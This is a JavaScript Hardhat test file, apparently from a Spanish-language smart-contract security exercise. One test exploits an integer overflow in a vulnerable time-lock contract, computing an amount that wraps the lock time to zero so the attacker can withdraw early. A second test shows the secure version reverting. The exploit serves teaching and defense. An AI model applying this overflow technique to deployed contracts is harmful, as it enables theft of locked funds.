import { expect } from "chai";
import hre from "hardhat";

describe("02 - Integer Overflow / Underflow", function () {
  let ethers;
  let Vulnerable, vulnerableContract;
  let Secure, secureContract;
  let deployer, attacker;
  let DEPOSIT_AMOUNT;

  before(async function () {
    const connection = await hre.network.getOrCreate();
    ethers = connection.ethers;
    DEPOSIT_AMOUNT = ethers.parseEther("1");
    [deployer, attacker] = await ethers.getSigners();
  });

  beforeEach(async function () {
    Vulnerable = await ethers.getContractFactory("TimeLockVulnerable");
    vulnerableContract = await Vulnerable.deploy();

    Secure = await ethers.getContractFactory("TimeLockSecure");
    secureContract = await Secure.deploy();
  });

  describe("Exploit en Contrato Vulnerable", function () {
    it("Debería permitir al atacante retirar saltándose el tiempo de bloqueo mediante un overflow", async function () {
      await vulnerableContract.connect(attacker).deposit({ value: DEPOSIT_AMOUNT });

      // Verificación manual de revert
      try {
        await vulnerableContract.connect(attacker).withdraw();
        expect.fail("Debería haber revertido");
      } catch (error) {
        expect(error.message).to.contain("El tiempo de bloqueo no ha expirado");
      }

      const lockTimeAtStart = await vulnerableContract.lockTime(attacker.address);
      const MAX_UINT256 = ethers.MaxUint256;
      const overflowAmount = MAX_UINT256 - lockTimeAtStart + 1n;

      await vulnerableContract.connect(attacker).increaseLockTime(overflowAmount);

      const lockTimeAfterAttack = await vulnerableContract.lockTime(attacker.address);
      expect(lockTimeAfterAttack).to.equal(0n);

      await vulnerableContract.connect(attacker).withdraw();

      const balanceFinal = await vulnerableContract.balances(attacker.address);
      expect(balanceFinal).to.equal(0n);
    });
  });

  describe("Defensa en Contrato Seguro", function () {
    it("Debería revertir la transacción al intentar provocar un overflow", async function () {
      await secureContract.connect(attacker).deposit({ value: DEPOSIT_AMOUNT });

      const lockTimeAtStart = await secureContract.lockTime(attacker.address);
      const MAX_UINT256 = ethers.MaxUint256;
      const overflowAmount = MAX_UINT256 - lockTimeAtStart + 1n;

      try {
        await secureContract.connect(attacker).increaseLockTime(overflowAmount);
        expect.fail("Debería haber revertido por overflow");
      } catch (error) {
        // En Solidity 0.8+, los overflows lanzan un Panic (0x11)
        expect(error.message).to.contain("panic code 0x11");
      }
    });
  });
});
